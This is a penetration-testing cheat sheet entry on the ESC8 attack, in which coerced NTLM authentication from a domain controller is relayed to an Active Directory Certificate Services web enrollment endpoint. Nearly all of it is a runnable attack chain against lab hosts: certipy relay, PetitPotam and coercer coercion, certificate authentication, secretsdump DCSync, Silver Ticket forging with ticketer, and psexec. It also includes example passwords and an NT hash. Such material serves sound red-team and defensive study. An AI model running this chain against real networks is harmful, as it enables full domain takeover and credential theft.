# 13.11 ESC8 NTLM Relay to ADCS HTTP Endpoint

> Relay coerced machine NTLM to the ADCS HTTP enrollment endpoint — `certipy relay` then `certipy auth` for the DC's NT hash.

## Overview

When the ADCS web enrollment endpoint (http://<server>/certsrv/certfnsh.asp) is enabled, coerced NTLM authentication from a domain machine can be relayed to it to obtain a client-authentication certificate for that machine. Using the DC's certificate allows DCSync or Silver Ticket attacks. certipy relay listens for NTLM and automatically relays to the CA HTTP endpoint.

## Steps

- Confirm: certipy find shows "Web Enrollment: Enabled" and ESC8 in Vulnerabilities
- Start certipy relay with -target http://<ADCS_IP> and -template DomainController (for DC coercion) or Machine (for workstations)
- In a second shell, coerce NTLM authentication from DC using coercer or PetitPotam
- certipy relay saves the resulting .pfx (e.g., lab-dc.pfx)
- Authenticate with certipy auth -pfx lab-dc.pfx to get TGT + NT hash of the machine account
- Perform DCSync with secretsdump.py using the TGT or NT hash
- Alternatively forge a Silver Ticket: use lookupsid.py to get domain SID, then ticketer.py, then psexec

## Commands

### certipy relay ESC8

```bash
sudo certipy relay -target 172.16.19.5 -template DomainController
```

### coercer coerce

```bash
coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
```

### PetitPotam coerce

```bash
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19 172.16.19.3
```

### certipy auth DC cert

```bash
certipy auth -pfx lab-dc.pfx
```

### secretsdump DCSync via TGT

```bash
KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local
```

### secretsdump DCSync via NT hash

```bash
secretsdump.py 'lab-dc$'@lab-dc.lab.local -hashes :92bd84175886a57ab41a14731d10428a
```

### lookupsid get domain SID

```bash
lookupsid.py 'lab-dc$'@172.16.19.3 -hashes :92bd84175886a57ab41a14731d10428a
```

### ticketer forge Silver Ticket

```bash
ticketer.py -nthash 92bd84175886a57ab41a14731d10428a -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/lab-dc.lab.local Administrator
```

### psexec with Silver Ticket

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass lab-dc.lab.local
```
